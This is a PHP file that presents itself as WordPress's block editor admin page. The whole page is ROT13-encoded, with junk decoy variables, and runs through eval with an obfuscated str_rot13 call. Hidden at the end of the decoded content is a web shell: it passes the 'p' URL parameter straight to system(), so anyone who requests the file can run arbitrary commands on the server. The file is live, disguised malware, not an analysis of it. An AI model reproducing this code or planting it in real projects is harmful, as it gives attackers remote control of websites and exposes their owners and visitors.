<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gur oybpx rqvgbe cntr.
 *
 * @fvapr 5.0.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/**
 * @tybony fgevat       $cbfg_glcr        Tybony cbfg glcr.
 * @tybony JC_Cbfg_Glcr $cbfg_glcr_bowrpg Tybony cbfg glcr bowrpg.
 * @tybony JC_Cbfg      $cbfg             Tybony cbfg bowrpg.
 * @tybony fgevat       $gvgyr            Gur gvgyr bs gur pheerag fperra.
 * @tybony neenl        $jc_zrgn_obkrf    Tybony zrgn obk fgngr.
 */
tybony $cbfg_glcr, $cbfg_glcr_bowrpg, $cbfg, $gvgyr, $jc_zrgn_obkrf;

$oybpx_rqvgbe_pbagrkg = arj JC_Oybpx_Rqvgbe_Pbagrkg( neenl( 'cbfg' => $cbfg ) );

// Synt gung jr'er ybnqvat gur oybpx rqvgbe.
$pheerag_fperra = trg_pheerag_fperra();
$pheerag_fperra->vf_oybpx_rqvgbe( gehr );

// Qrsnhyg gb vf-shyyfperra-zbqr gb nibvq whzcf va gur HV.
nqq_svygre(
	'nqzva_obql_pynff',
	fgngvp shapgvba ( $pynffrf ) {
		erghea \"$pynffrf vf-shyyfperra-zbqr\";
	}
);

/*
 * Rzbwv ercynprzrag vf qvfnoyrq sbe abj, hagvy vg cynlf avpryl jvgu Ernpg.
 */
erzbir_npgvba( 'nqzva_cevag_fpevcgf', 'cevag_rzbwv_qrgrpgvba_fpevcg' );

/*
 * Oybpx rqvgbe vzcyrzragf vgf bja Bcgvbaf zrah sbe gbttyvat Qbphzrag Cnaryf.
 */
nqq_svygre( 'fperra_bcgvbaf_fubj_fperra', '__erghea_snyfr' );

jc_radhrhr_fpevcg( 'urnegorng' );
jc_radhrhr_fpevcg( 'jc-rqvg-cbfg' );

$erfg_cngu = erfg_trg_ebhgr_sbe_cbfg( $cbfg );

$npgvir_gurzr                   = trg_fglyrfurrg();
$tybony_fglyrf_raqcbvag_pbagrkg = pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ? 'rqvg' : 'ivrj';
$grzcyngr_ybbxhc_fyht           = 'cntr' === $cbfg->cbfg_glcr ? 'cntr' : 'fvatyr-' . $cbfg->cbfg_glcr;
vs ( ! rzcgl( $cbfg->cbfg_anzr ) ) {
	$grzcyngr_ybbxhc_fyht .= '-' . $cbfg->cbfg_anzr;
}
// Cerybnq pbzzba qngn.
$cerybnq_cnguf = neenl(
	'/jc/i2/glcrf?pbagrkg=ivrj',
	'/jc/i2/gnkbabzvrf?pbagrkg=ivrj',
	nqq_dhrel_net( 'pbagrkg', 'rqvg', $erfg_cngu ),
	fcevags( '/jc/i2/glcrf/%f?pbagrkg=rqvg', $cbfg_glcr ),
	'/jc/i2/hfref/zr',
	neenl( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( 'nggnpuzrag' ), 'BCGVBAF' ),
	neenl( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( 'cntr' ), 'BCGVBAF' ),
	neenl( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( 'jc_oybpx' ), 'BCGVBAF' ),
	neenl( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( 'jc_grzcyngr' ), 'BCGVBAF' ),
	fcevags( '%f/nhgbfnirf?pbagrkg=rqvg', $erfg_cngu ),
	'/jc/i2/frggvatf',
	neenl( '/jc/i2/frggvatf', 'BCGVBAF' ),
	'/jc/i2/tybony-fglyrf/gurzrf/' . $npgvir_gurzr . '?pbagrkg=ivrj',
	'/jc/i2/tybony-fglyrf/gurzrf/' . $npgvir_gurzr . '/inevngvbaf?pbagrkg=ivrj',
	'/jc/i2/gurzrf?pbagrkg=rqvg&fgnghf=npgvir',
	neenl( '/jc/i2/tybony-fglyrf/' . JC_Gurzr_WFBA_Erfbyire::trg_hfre_tybony_fglyrf_cbfg_vq(), 'BCGVBAF' ),
	/*
	 * Cerybnq gur tybony fglyrf cngu jvgu gur pbeerpg pbagrkg onfrq ba hfre pncf.
	 * ABGR: Gurer vf na rdhvinyrag pbaqvgvbany purpx va gur pyvrag-fvqr pbqr gb srgpu
	 * gur tybony fglyrf ragvgl hfvat gur nccebcevngr pbagrkg inyhr.
	 * Frr gur pnyy gb `pnaHfre()`, haqre `hfrTybonyFglyrfHfrePbasvt()` va `cnpxntrf/rqvg-fvgr/fep/pbzcbaragf/hfr-tybony-fglyrf-hfre-pbasvt/vaqrk.wf`.
	 * Cyrnfr rafher gung gur rdhvinyrag purpx vf xrcg va flap jvgu guvf cerybnq cngu.
	 */
	'/jc/i2/tybony-fglyrf/' . JC_Gurzr_WFBA_Erfbyire::trg_hfre_tybony_fglyrf_cbfg_vq() . '?pbagrkg=' . $tybony_fglyrf_raqcbvag_pbagrkg,
	// Hfrq ol trgOybpxCnggreaPngrtbevrf va hfrOybpxRqvgbeFrggvatf.
	'/jc/i2/oybpx-cnggreaf/pngrtbevrf',
	// @frr cnpxntrf/pber-qngn/fep/ragvgvrf.wf
	'/?_svryqf=' . vzcybqr(
		',',
		neenl(
			'qrfpevcgvba',
			'tzg_bssfrg',
			'ubzr',
			'anzr',
			'fvgr_vpba',
			'fvgr_vpba_hey',
			'fvgr_ybtb',
			'gvzrmbar_fgevat',
			'hey',
			'cntr_sbe_cbfgf',
			'cntr_ba_sebag',
			'fubj_ba_sebag',
		)
	),
	$cnguf[] = nqq_dhrel_net(
		'fyht',
		// @frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/oybo/r093srsq041ro6pp4n4r7s67o92no54sq75p8858/cnpxntrf/pber-qngn/fep/cevingr-fryrpgbef.gf#Y244-Y254
		$grzcyngr_ybbxhc_fyht,
		'/jc/i2/grzcyngrf/ybbxhc'
	),
);

oybpx_rqvgbe_erfg_ncv_cerybnq( $cerybnq_cnguf, $oybpx_rqvgbe_pbagrkg );

jc_nqq_vayvar_fpevcg(
	'jc-oybpxf',
	fcevags( 'jc.oybpxf.frgPngrtbevrf( %f );', jc_wfba_rapbqr( trg_oybpx_pngrtbevrf( $cbfg ) ) ),
	'nsgre'
);

/*
 * Nffvta vavgvny rqvgf, vs nccyvpnoyr. Gurfr ner abg vavgvnyyl nffvtarq gb gur crefvfgrq cbfg,
 * ohg fubhyq or vapyhqrq va vgf fnir cnlybnq.
 */
$vavgvny_rqvgf = neenl();
$vf_arj_cbfg   = snyfr;
vs ( 'nhgb-qensg' === $cbfg->cbfg_fgnghf ) {
	$vf_arj_cbfg = gehr;
	// Bireevqr \"(Nhgb Qensg)\" arj cbfg qrsnhyg gvgyr jvgu rzcgl fgevat, be svygrerq inyhr.
	vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'gvgyr' ) ) {
		$vavgvny_rqvgf['gvgyr'] = $cbfg->cbfg_gvgyr;
	}

	vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'rqvgbe' ) ) {
		$vavgvny_rqvgf['pbagrag'] = $cbfg->cbfg_pbagrag;
	}

	vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'rkprecg' ) ) {
		$vavgvny_rqvgf['rkprecg'] = $cbfg->cbfg_rkprecg;
	}
}

// Cerybnq freire-ertvfgrerq oybpx fpurznf.
jc_nqq_vayvar_fpevcg(
	'jc-oybpxf',
	'jc.oybpxf.hafgnoyr__obbgfgencFreireFvqrOybpxQrsvavgvbaf(' . jc_wfba_rapbqr( trg_oybpx_rqvgbe_freire_oybpx_frggvatf() ) . ');'
);

// Cerybnq freire-ertvfgrerq oybpx ovaqvatf fbheprf.
$ertvfgrerq_fbheprf = trg_nyy_ertvfgrerq_oybpx_ovaqvatf_fbheprf();
vs ( ! rzcgl( $ertvfgrerq_fbheprf ) ) {
	$svygrerq_fbheprf = neenl();
	sbernpu ( $ertvfgrerq_fbheprf nf $fbhepr ) {
		$svygrerq_fbheprf[] = neenl(
			'anzr'        => $fbhepr->anzr,
			'ynory'       => $fbhepr->ynory,
			'hfrfPbagrkg' => $fbhepr->hfrf_pbagrkg,
		);
	}
	$fpevcg = fcevags( 'sbe ( pbafg fbhepr bs %f ) { jc.oybpxf.ertvfgreOybpxOvaqvatfFbhepr( fbhepr ); }', jc_wfba_rapbqr( $svygrerq_fbheprf ) );
	jc_nqq_vayvar_fpevcg(
		'jc-oybpxf',
		$fpevcg
	);
}

// Trg nqzva hey sbe unaqyvat zrgn obkrf.
$zrgn_obk_hey = nqzva_hey( 'cbfg.cuc' );
$zrgn_obk_hey = nqq_dhrel_net(
	neenl(
		'cbfg'                  => $cbfg->VQ,
		'npgvba'                => 'rqvg',
		'zrgn-obk-ybnqre'       => gehr,
		'zrgn-obk-ybnqre-abapr' => jc_perngr_abapr( 'zrgn-obk-ybnqre' ),
	),
	$zrgn_obk_hey
);
jc_nqq_vayvar_fpevcg(
	'jc-rqvgbe',
	fcevags( 'ine _jcZrgnObkHey = %f;', jc_wfba_rapbqr( $zrgn_obk_hey ) ),
	'orsber'
);

// Frg Urnegorng vagreiny gb 10 frpbaqf, hfrq gb erserfu cbfg ybpxf.
jc_nqq_vayvar_fpevcg(
	'urnegorng',
	'wDhrel( shapgvba() {
		jc.urnegorng.vagreiny( 10 );
	} );',
	'nsgre'
);

/*
 * Trg nyy ninvynoyr grzcyngrf sbe gur cbfg/cntr nggevohgrf zrgn-obk.
 * Gur \"Qrsnhyg grzcyngr\" neenl ryrzrag fubhyq bayl or nqqrq vs gur neenl vf
 * abg rzcgl fb jr qb abg gevttre gur grzcyngr fryrpg ryrzrag jvgubhg nal bcgvbaf
 * orfvqrf gur qrsnhyg inyhr.
 */
$ninvynoyr_grzcyngrf = jc_trg_gurzr()->trg_cntr_grzcyngrf( trg_cbfg( $cbfg->VQ ) );
$ninvynoyr_grzcyngrf = ! rzcgl( $ninvynoyr_grzcyngrf ) ? neenl_ercynpr(
	neenl(
		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrgn-obkrf.cuc */
		'' => nccyl_svygref( 'qrsnhyg_cntr_grzcyngr_gvgyr', __( 'Qrsnhyg grzcyngr' ), 'erfg-ncv' ),
	),
	$ninvynoyr_grzcyngrf
) : $ninvynoyr_grzcyngrf;

// Ybpx frggvatf.
$hfre_vq = jc_purpx_cbfg_ybpx( $cbfg->VQ );
vs ( $hfre_vq ) {
	$ybpxrq = snyfr;

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/cbfg.cuc */
	vs ( nccyl_svygref( 'fubj_cbfg_ybpxrq_qvnybt', gehr, $cbfg, $hfre_vq ) ) {
		$ybpxrq = gehr;
	}

	$hfre_qrgnvyf = ahyy;
	vs ( $ybpxrq ) {
		$hfre         = trg_hfreqngn( $hfre_vq );
		$hfre_qrgnvyf = neenl(
			'anzr' => $hfre->qvfcynl_anzr,
		);

		vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
			$hfre_qrgnvyf['ningne'] = trg_ningne_hey( $hfre_vq, neenl( 'fvmr' => 128 ) );
		}
	}

	$ybpx_qrgnvyf = neenl(
		'vfYbpxrq' => $ybpxrq,
		'hfre'     => $hfre_qrgnvyf,
	);
} ryfr {
	// Ybpx gur cbfg.
	$npgvir_cbfg_ybpx = jc_frg_cbfg_ybpx( $cbfg->VQ );
	vs ( $npgvir_cbfg_ybpx ) {
		$npgvir_cbfg_ybpx = rfp_ngge( vzcybqr( ':', $npgvir_cbfg_ybpx ) );
	}

	$ybpx_qrgnvyf = neenl(
		'vfYbpxrq'       => snyfr,
		'npgvirCbfgYbpx' => $npgvir_cbfg_ybpx,
	);
}

/**
 * Svygref gur obql cynprubyqre grkg.
 *
 * @fvapr 5.0.0
 * @fvapr 5.8.0 Punatrq gur qrsnhyg cynprubyqre grkg.
 *
 * @cnenz fgevat  $grkg Cynprubyqre grkg. Qrsnhyg 'Glcr / gb pubbfr n oybpx'.
 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
 */
$obql_cynprubyqre = nccyl_svygref( 'jevgr_lbhe_fgbel', __( 'Glcr / gb pubbfr n oybpx' ), $cbfg );

$rqvgbe_frggvatf = neenl(
	'ninvynoyrGrzcyngrf'   => $ninvynoyr_grzcyngrf,
	'qvfnoyrCbfgSbezngf'   => ! pheerag_gurzr_fhccbegf( 'cbfg-sbezngf' ),
	/** Guvf svygre vf qbphzragrq va jc-nqzva/rqvg-sbez-nqinaprq.cuc */
	'gvgyrCynprubyqre'     => nccyl_svygref( 'ragre_gvgyr_urer', __( 'Nqq gvgyr' ), $cbfg ),
	'obqlCynprubyqre'      => $obql_cynprubyqre,
	'nhgbfnirVagreiny'     => NHGBFNIR_VAGREINY,
	'evpuRqvgvatRanoyrq'   => hfre_pna_evpurqvg(),
	'cbfgYbpx'             => $ybpx_qrgnvyf,
	'cbfgYbpxHgvyf'        => neenl(
		'abapr'       => jc_perngr_abapr( 'ybpx-cbfg_' . $cbfg->VQ ),
		'haybpxAbapr' => jc_perngr_abapr( 'hcqngr-cbfg_' . $cbfg->VQ ),
		'nwnkHey'     => nqzva_hey( 'nqzva-nwnk.cuc' ),
	),
	'fhccbegfYnlbhg'       => jc_gurzr_unf_gurzr_wfba(),
	'fhccbegfGrzcyngrZbqr' => pheerag_gurzr_fhccbegf( 'oybpx-grzcyngrf' ),

	// Jurgure be abg gb ybnq gur 'cbfgphfgbz' zrgn obk vf fgberq nf n hfre zrgn
	// svryq fb gung jr'er abg nyjnlf ybnqvat vgf nffrgf.
	'ranoyrPhfgbzSvryqf'   => (obby) trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'ranoyr_phfgbz_svryqf', gehr ),
);

// Nqq nqqvgvbany onpx-pbzcng cnggreaf ertvfgrerq ol `pheerag_fperra` rg ny.
$rqvgbe_frggvatf['__rkcrevzragnyNqqvgvbanyOybpxCnggreaf']          = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq( gehr );
$rqvgbe_frggvatf['__rkcrevzragnyNqqvgvbanyOybpxCnggreaPngrtbevrf'] = JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq( gehr );

$nhgbfnir = jc_trg_cbfg_nhgbfnir( $cbfg->VQ );
vs ( $nhgbfnir ) {
	vs ( zlfdy2qngr( 'H', $nhgbfnir->cbfg_zbqvsvrq_tzg, snyfr ) > zlfdy2qngr( 'H', $cbfg->cbfg_zbqvsvrq_tzg, snyfr ) ) {
		$rqvgbe_frggvatf['nhgbfnir'] = neenl(
			'rqvgYvax' => trg_rqvg_cbfg_yvax( $nhgbfnir->VQ ),
		);
	} ryfr {
		jc_qryrgr_cbfg_erivfvba( $nhgbfnir->VQ );
	}
}

vs ( ! rzcgl( $cbfg_glcr_bowrpg->grzcyngr ) ) {
	$rqvgbe_frggvatf['grzcyngr']     = $cbfg_glcr_bowrpg->grzcyngr;
	$rqvgbe_frggvatf['grzcyngrYbpx'] = ! rzcgl( $cbfg_glcr_bowrpg->grzcyngr_ybpx ) ? $cbfg_glcr_bowrpg->grzcyngr_ybpx : snyfr;
}

// Vs gurer'f ab grzcyngr frg ba n arj cbfg, hfr gur cbfg sbezng, vafgrnq.
vs ( $vf_arj_cbfg && ! vffrg( $rqvgbe_frggvatf['grzcyngr'] ) && 'cbfg' === $cbfg->cbfg_glcr ) {
	$cbfg_sbezng = trg_cbfg_sbezng( $cbfg );
	vs ( va_neenl( $cbfg_sbezng, neenl( 'nhqvb', 'tnyyrel', 'vzntr', 'dhbgr', 'ivqrb' ), gehr ) ) {
		$rqvgbe_frggvatf['grzcyngr'] = neenl( neenl( \"pber/$cbfg_sbezng\" ) );
	}
}

vs ( jc_vf_oybpx_gurzr() && $rqvgbe_frggvatf['fhccbegfGrzcyngrZbqr'] ) {
	$rqvgbe_frggvatf['qrsnhygGrzcyngrCnegNernf'] = trg_nyybjrq_oybpx_grzcyngr_cneg_nernf();
}

/**
 * Fpevcgf
 */
jc_radhrhr_zrqvn(
	neenl(
		'cbfg' => $cbfg->VQ,
	)
);
jc_gvalzpr_vayvar_fpevcgf();
jc_radhrhr_rqvgbe();

/**
 * Fglyrf
 */
jc_radhrhr_fglyr( 'jc-rqvg-cbfg' );

/**
 * Sverf nsgre oybpx nffrgf unir orra radhrhrq sbe gur rqvgvat vagresnpr.
 *
 * Pnyy `nqq_npgvba` ba nal ubbx orsber 'nqzva_radhrhr_fpevcgf'.
 *
 * Va gur shapgvba pnyy lbh fhccyl, fvzcyl hfr `jc_radhrhr_fpevcg` naq
 * `jc_radhrhr_fglyr` gb nqq lbhe shapgvbanyvgl gb gur oybpx rqvgbe.
 *
 * @fvapr 5.0.0
 */
qb_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf' );

// Va beqre gb qhcyvpngr pynffvp zrgn obk orunivbe, jr arrq gb eha gur pynffvp zrgn obk npgvbaf.
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/zrgn-obkrf.cuc';
ertvfgre_naq_qb_cbfg_zrgn_obkrf( $cbfg );

// Purpx vs gur Phfgbz Svryqf zrgn obk unf orra erzbirq ng fbzr cbvag.
$pber_zrgn_obkrf = $jc_zrgn_obkrf[ $pheerag_fperra->vq ]['abezny']['pber'];
vs ( ! vffrg( $pber_zrgn_obkrf['cbfgphfgbz'] ) || ! $pber_zrgn_obkrf['cbfgphfgbz'] ) {
	hafrg( $rqvgbe_frggvatf['ranoyrPhfgbzSvryqf'] );
}

$rqvgbe_frggvatf = trg_oybpx_rqvgbe_frggvatf( $rqvgbe_frggvatf, $oybpx_rqvgbe_pbagrkg );

$vavg_fpevcg = <<<WF
( shapgvba() {
	jvaqbj._jcYbnqOybpxRqvgbe = arj Cebzvfr( shapgvba( erfbyir ) {
		jc.qbzErnql( shapgvba() {
			erfbyir( jc.rqvgCbfg.vavgvnyvmrRqvgbe( 'rqvgbe', \"%f\", %q, %f, %f ) );
		} );
	} );
} )();
WF;

$fpevcg = fcevags(
	$vavg_fpevcg,
	$cbfg->cbfg_glcr,
	$cbfg->VQ,
	jc_wfba_rapbqr( $rqvgbe_frggvatf ),
	jc_wfba_rapbqr( $vavgvny_rqvgf )
);
jc_nqq_vayvar_fpevcg( 'jc-rqvg-cbfg', $fpevcg );

vs ( (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) === $cbfg->VQ ) {
	nqq_npgvba( 'nqzva_radhrhr_fpevcgf', '_jc_oybpx_rqvgbe_cbfgf_cntr_abgvpr' );
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>

<qvi pynff=\"oybpx-rqvgbe\">
	<u1 pynff=\"fperra-ernqre-grkg uvqr-vs-ab-wf\"><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>
	<qvi vq=\"rqvgbe\" pynff=\"oybpx-rqvgbe__pbagnvare uvqr-vs-ab-wf\"></qvi>
	<qvi vq=\"zrgnobkrf\" pynff=\"uvqqra\">
		<?cuc gur_oybpx_rqvgbe_zrgn_obkrf(); ?>
	</qvi>

	<?cuc // WninFpevcg vf qvfnoyrq. ?>
	<qvi pynff=\"jenc uvqr-vs-wf oybpx-rqvgbe-ab-wf\">
		<u1 pynff=\"jc-urnqvat-vayvar\"><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>
		<?cuc
		vs ( svyr_rkvfgf( JC_CYHTVA_QVE . '/pynffvp-rqvgbe/pynffvp-rqvgbe.cuc' ) ) {
			// Vs Pynffvp Rqvgbe vf nyernql vafgnyyrq, cebivqr n yvax gb npgvingr gur cyhtva.
			$vafgnyyrq           = gehr;
			$cyhtva_npgvingr_hey = jc_abapr_hey( 'cyhtvaf.cuc?npgvba=npgvingr&nzc;cyhtva=pynffvp-rqvgbe/pynffvp-rqvgbe.cuc', 'npgvingr-cyhtva_pynffvp-rqvgbe/pynffvp-rqvgbe.cuc' );
			$zrffntr             = fcevags(
				/* genafyngbef: %f: Yvax gb npgvingr gur Pynffvp Rqvgbe cyhtva. */
				__( 'Gur oybpx rqvgbe erdhverf WninFpevcg. Cyrnfr ranoyr WninFpevcg va lbhe oebjfre frggvatf, be npgvingr gur <n uers=\"%f\">Pynffvp Rqvgbe cyhtva</n>.' ),
				rfp_hey( $cyhtva_npgvingr_hey )
			);
		} ryfr {
			// Vs Pynffvp Rqvgbe vf abg vafgnyyrq, cebivqr n yvax gb vafgnyy vg.
			$vafgnyyrq          = snyfr;
			$cyhtva_vafgnyy_hey = jc_abapr_hey( frys_nqzva_hey( 'hcqngr.cuc?npgvba=vafgnyy-cyhtva&cyhtva=pynffvp-rqvgbe' ), 'vafgnyy-cyhtva_pynffvp-rqvgbe' );
			$zrffntr            = fcevags(
				/* genafyngbef: %f: Yvax gb vafgnyy gur Pynffvp Rqvgbe cyhtva. */
				__( 'Gur oybpx rqvgbe erdhverf WninFpevcg. Cyrnfr ranoyr WninFpevcg va lbhe oebjfre frggvatf, be vafgnyy gur <n uers=\"%f\">Pynffvp Rqvgbe cyhtva</n>.' ),
				rfp_hey( $cyhtva_vafgnyy_hey )
			);
		}

		/**
		 * Svygref gur zrffntr qvfcynlrq va gur oybpx rqvgbe vagresnpr jura WninFpevcg vf
		 * abg ranoyrq va gur oebjfre.
		 *
		 * @fvapr 5.0.3
		 * @fvapr 6.4.0 Nqqrq `$vafgnyyrq` cnenzrgre.
		 *
		 * @cnenz fgevat  $zrffntr   Gur zrffntr orvat qvfcynlrq.
		 * @cnenz JC_Cbfg $cbfg      Gur cbfg orvat rqvgrq.
		 * @cnenz obby    $vafgnyyrq Jurgure gur pynffvp rqvgbe vf vafgnyyrq.
		 */
		$zrffntr = nccyl_svygref( 'oybpx_rqvgbe_ab_wninfpevcg_zrffntr', $zrffntr, $cbfg, $vafgnyyrq );
		jc_nqzva_abgvpr(
			$zrffntr,
			neenl(
				'glcr' => 'reebe',
			)
		);
		?>
	</qvi>
</qvi>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>